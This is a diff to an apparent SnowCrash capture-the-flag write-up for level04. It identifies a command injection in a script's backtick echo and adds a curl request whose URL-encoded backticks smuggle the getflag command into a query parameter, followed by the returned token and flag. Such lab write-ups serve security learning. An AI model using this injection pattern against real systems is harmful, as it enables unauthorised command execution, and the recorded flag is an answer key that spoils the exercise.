@@ -132,3 +132,13 @@ x(param("x"));
 ```
 
 Vulnerability: Command injection in ```print `echo $y 2>&1`;```
+
+Exploit:
+
+```bash
+level04@SnowCrash:~$ curl http://localhost:4747/?x=%60getflag%60
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+level04@SnowCrash:~$
+```
+
+Flag: `ne2searoevaevoem4ov4ar8ap`
